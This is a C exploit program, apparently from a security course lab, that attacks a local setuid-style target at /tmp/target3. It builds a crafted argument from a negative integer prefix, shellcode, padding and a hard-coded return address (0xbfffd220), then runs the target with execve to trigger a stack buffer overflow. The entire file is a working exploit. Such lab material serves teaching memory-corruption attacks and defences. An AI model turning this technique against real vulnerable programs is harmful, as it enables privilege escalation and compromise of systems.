#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
//	printf("size of int = %d, size of double = %d\n", sizeof(int), sizeof(double));
	int i;
	char arg1[5677] = "-1994091757,";

/*	char arg1[12];
	for(i = 0; i < 13 ; i++)
		arg1[i] = arg0[i];
	arg1[10] = 'a';
	arg1[11] = 'a';
	arg1[12] = 0;
/*
	for(i = 0; i < 10 ; i++)
	printf("%c",arg1[i]);
	printf("\n");
*/
	char data[5656];
	for(i = 0; i < strlen(shellcode); i++ )
		data[i] = shellcode[i];
	for(i = strlen(shellcode); i < 5612 ; i ++)
		data[i] = 'a';
	data[5612] = 0x20;
	data[5613] = 0xd2;
	data[5614] = 0xff;
	data[5615] = 0xbf;
	for(i = 5616; i < 5655; i++)
		data[i] = 'b';
	data[5655]= 0;
	strcat(arg1, data);
//	printf("arg1 = %s\n", arg1);
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
